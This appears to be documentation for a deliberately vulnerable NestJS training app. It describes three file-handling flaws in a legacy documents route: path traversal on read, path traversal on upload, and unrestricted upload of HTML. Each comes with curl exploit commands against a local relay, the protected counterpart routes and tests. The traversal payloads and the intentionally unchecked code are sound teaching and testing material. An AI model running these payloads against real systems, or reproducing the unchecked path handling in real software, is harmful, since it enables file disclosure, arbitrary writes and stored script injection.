# `FS` — files

Three weaknesses of the old console's document routes in `accounts`. Reproductions run against the accounts relay, `RELAY` (`http://127.0.0.1:4111` on the builder's port set; `3201` on the defaults); the launcher runs the services from the repository root, so a name with no `..` already reaches the repository.

## FS-001 — the file name is the path

### FS-001 — agent reference

| | |
| --- | --- |
| Operation | REST `GET /internal/documents/file/:name` |
| Sink | The caller's name resolved against the directory the service runs in, in `apps/accounts/src/legacy/legacy-documents.controller.ts` |
| Flow | `..%2F..%2Fpackage.json` → `readFile(resolve(name))` → any file the process can read |
| Counterparts | `apps/accounts/src/documents/documents.controller.ts` (`:id/view`: the stored name comes from the record; `by-name/:name`: the stored path is resolved and checked against the directory) |
| Tests | `apps/accounts/test/scenarios/fs-xss-ssrf.int-spec.ts` |
| Expected finding | Yes, CWE-22, SAST |

### FS-001 — student guide

A route that serves by name trusts the name to stay inside. `resolve` turns `..` into a climb, and the process can read far more than its own documents: the repository it runs from included.

### FS-001 — exploit lab

From the repository root (the start command's own working directory):

```console
$ curl -s $RELAY/internal/documents/file/package.json -H "authorization: Bearer $ALICE" | jq .name
"vuln-nestjs"
```

The repository's manifest, read through a document route. From a test, whose service runs in `apps/accounts`, the same climb is spelled:

```console
$ curl -s $RELAY/internal/documents/file/..%2F..%2Fpackage.json -H "authorization: Bearer $ALICE" | jq .name
"vuln-nestjs"
```

The same traversal against the counterparts:

```console
$ curl -s -o /dev/null -w '%{http_code}\n' $RELAY/internal/documents/by-name/..%2F..%2Fpackage.json -H "authorization: Bearer $ALICE"
404
$ curl -s -i $RELAY/internal/documents/d-alice-avatar/view -H "authorization: Bearer $ALICE" | grep -i 'content-disposition\|x-content-type'
content-disposition: attachment
x-content-type-options: nosniff
```

No document carries that name, and the bytes of one that did would be read from the path the record names, checked to stay inside.

### FS-001 — vulnerable and protected

| | Why |
| --- | --- |
| `file/:name` (vulnerable) | The name is resolved against the process's own directory, so `..` climbs out of everything the service owns |
| `:id/view` (protected) | The name comes from the database record, never from the caller |
| `by-name/:name` (protected) | The stored path is resolved and checked against the documents directory before anything is read |

### FS-001 — tests

`apps/accounts/test/scenarios/fs-xss-ssrf.int-spec.ts`, `FS-001`: `..%2F..%2Fpackage.json` answers the repository manifest; the id route serves the seeded PNG as an attachment; the by-name route answers 404 for the traversal.

## FS-002 — the upload is stored under its own name

### FS-002 — agent reference

| | |
| --- | --- |
| Operation | REST `POST /internal/documents/legacy` |
| Sink | The caller's destination name joined to the documents directory unchecked, in `apps/accounts/src/legacy/legacy-documents.controller.ts` |
| Flow | `?name=../outside-zazzles.txt` → `write(documents/../outside-zazzles.txt)` → the write lands outside the upload directory |
| Counterparts | `apps/accounts/src/documents/documents.controller.ts` (`POST /internal/documents`: a generated name; `checked`: the same, behind the signature check) |
| Tests | `apps/accounts/test/scenarios/fs-xss-ssrf.int-spec.ts` |
| Expected finding | Yes, CWE-22, SAST |

### FS-002 — student guide

The console's uploader named the destination file itself, and the service believed the name. (The multipart layer strips paths from the file's own name, which is why the old console sent the destination as the request's `name` field.) Joined unchecked, `..` writes a directory up from the uploads.

### FS-002 — exploit lab

```console
$ curl -s $RELAY 'internal/documents/legacy?name=..%2Fmarker.html' -H "authorization: Bearer $ALICE" \
    -F 'file=@marker.html;type=text/html'
{"id":"d-deded4c0-…","originalName":"../marker.html","mimeType":"text/html","size":56,…}
```

The answer names the destination as it was spelled; the file landed in the store's root, one directory above `documents`, where no upload belongs. The same upload through the safe route stores a generated name inside:

```console
$ curl -s $RELAY/internal/documents -H "authorization: Bearer $ALICE" -F 'file=@inside.txt;type=text/plain'
{"id":"…","originalName":"inside.txt","mimeType":"text/plain",…}
```

and the files on disk are `<uuid>.txt`, inside the documents directory, whatever the uploader's file was called.

### FS-002 — vulnerable and protected

| | Why |
| --- | --- |
| `legacy?name=…` (vulnerable) | The destination is the caller's, joined to the directory as spelled |
| `POST /internal/documents` (protected) | The stored name is a fresh identifier with an allowlisted extension; the uploader's name is data |
| `POST /internal/documents/checked` (protected) | The same generated name, after the extension, size and signature checks |

### FS-002 — tests

`apps/accounts/test/scenarios/fs-xss-ssrf.int-spec.ts`, `FS-002`: the legacy upload writes `outside-zazzles.txt` in the store's root and not in `documents`; both safe routes store uuid-named files inside and nothing outside.

## FS-003 — any type accepted, HTML included

### FS-003 — agent reference

| | |
| --- | --- |
| Operation | REST `POST /internal/documents/legacy` |
| Sink | No check on extension or content type: the upload's content type is stored as given, in `apps/accounts/src/legacy/legacy-documents.controller.ts` |
| Flow | an `.html` part arrives as `text/html` → both are stored as the uploader's word |
| Counterparts | `apps/accounts/src/documents/documents.controller.ts` (`POST /internal/documents`: extension and size allowlist; `checked`: plus the file signature) |
| Tests | `apps/accounts/test/scenarios/fs-xss-ssrf.int-spec.ts` |
| Expected finding | Yes, CWE-434, SAST |

### FS-003 — student guide

An upload route that accepts whatever it is handed becomes the storage of whatever the next weakness needs. HTML and SVG are script carriers; the safe routes allowlist four extensions, and the checked route also makes the bytes prove their extension.

### FS-003 — exploit lab

```console
$ curl -s $RELAY/internal/documents/legacy -H "authorization: Bearer $ALICE" \
    -F 'file=@marker.html;type=text/html'
{"id":"…","originalName":"marker.html","mimeType":"text/html","size":56,…}
```

Accepted, `text/html` and all (this upload is XSS-002's payload). The same part through the counterparts:

```console
$ curl -s $RELAY/internal/documents -H "authorization: Bearer $ALICE" -F 'file=@marker.html;type=text/html'
{"message":"A document ends in .png, .jpg, .pdf, .txt", …}          # 400
$ curl -s $RELAY/internal/documents/checked -H "authorization: Bearer $ALICE" \
    -F 'file=@marker.png;type=image/png'                            # HTML bytes
{"message":"The file does not start with the signature its extension claims", …}  # 400
```

### FS-003 — vulnerable and protected

| | Why |
| --- | --- |
| `legacy` (vulnerable) | Extension and content type are the uploader's word, stored as given |
| `POST /internal/documents` (protected) | The extension allowlist is png, jpg, pdf, txt, and the size is capped |
| `checked` (protected) | The same, plus the file's first bytes must match the signature the extension claims |

### FS-003 — tests

`apps/accounts/test/scenarios/fs-xss-ssrf.int-spec.ts`, `FS-003`: the legacy route accepts the HTML upload with its content type; the safe route refuses the extension; the checked route also refuses a lying signature.
